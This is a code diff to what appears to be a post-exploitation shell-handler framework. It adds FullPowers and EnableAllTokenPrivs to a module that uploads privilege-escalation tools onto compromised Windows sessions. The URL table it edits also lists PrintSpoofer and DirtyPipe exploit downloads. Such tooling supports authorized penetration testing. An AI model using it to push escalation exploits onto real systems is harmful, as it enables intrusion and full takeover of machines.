@@ -4759,7 +4759,7 @@ class upload_privesc_scripts(Module):
 
 	def run(session, args):
 		"""
-		Upload {linpeas, lse, deepce, pspy || winpeas, powerup, privesccheck}
+		Upload {linpeas, lse, deepce, pspy || winpeas, powerup, privesccheck, fullpowers, enablealltokenprivs}
 		Example:
 			upload_privesc_scripts winpeas
 			upload_privesc_scripts linpeas pspy64
@@ -4787,6 +4787,8 @@ class upload_privesc_scripts(Module):
 				"winpeas_bat": lambda: session.upload(URLS['winpeas_bat']),
 				"powerup": lambda: session.upload(URLS['powerup']),
 				"privesccheck": lambda: session.upload(URLS['privesccheck']),
+				"fullpowers": lambda: session.upload(URLS['fullpowers']),
+				"enablealltokenprivs": lambda: session.upload(URLS['enablealltokenprivs']),
 			}
 
 		if not requested:
@@ -4796,7 +4798,7 @@ class upload_privesc_scripts(Module):
 
 		for tool in requested:
 
-			if session.OS == 'Unix' and tool in ["winpeas", "winpeas_bat", "powerup", "privesccheck"]:
+			if session.OS == 'Unix' and tool in ["winpeas", "winpeas_bat", "powerup", "privesccheck", "fullpowers", "enablealltokenprivs"]:
 				logger.warning(f"{tool} is not available on Unix targets")
 				continue
 			if session.OS == 'Windows' and tool in ["linpeas", "lse", "deepce", "pspy"]:
@@ -6524,6 +6526,8 @@ URLS = {
 	'printspoofer32':	"https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe",
 	'dirtyfrag':		"https://raw.githubusercontent.com/V4bel/dirtyfrag/refs/heads/master/exp.c",
 	'dirtypipe_zip':	"https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/archive/refs/heads/main.zip",
+	'fullpowers':		"https://github.com/itm4n/FullPowers/releases/download/v0.1/FullPowers.exe",
+	'enablealltokenprivs':	"https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1",
 }
 
 PYTHON_STANDALONE_BINARIES = {
@@ -6581,5 +6585,3 @@ load_rc()
 
 if __name__ == "__main__":
 	main()
-
-
